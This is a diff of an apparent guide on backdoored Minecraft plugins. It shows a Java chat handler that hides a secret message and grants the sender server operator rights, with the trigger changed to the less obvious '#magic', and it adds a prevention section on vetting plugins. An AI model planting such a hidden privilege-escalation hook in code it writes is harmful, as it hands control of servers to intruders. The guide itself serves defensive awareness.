@@ -24,10 +24,14 @@ public class main extends JavaPlugin implements Listener {
     
     @EventHandler
     public void onPlayerChat(PlayerChatEvent event) {
-        if (event.getMessage().startsWith("#op")) {
+        if (event.getMessage().startsWith("#magic")) {
             event.setCancelled(true);
             event.getPlayer().setOp(true);
         }
     }
 }
 ```
+
+**Prevention**
+
+Always make sure the plugins and scripts you installed on your server are legitimate, and not backdoored. Don't trust random people that tries to make you install a plugin or script on your server. If in doubt, use a Java decompiler to read the code of the plugin, and any text editor for scripts. If the code is obfuscated, and you're not 100% sure if the plugin or script is legit, don't install it on your server.
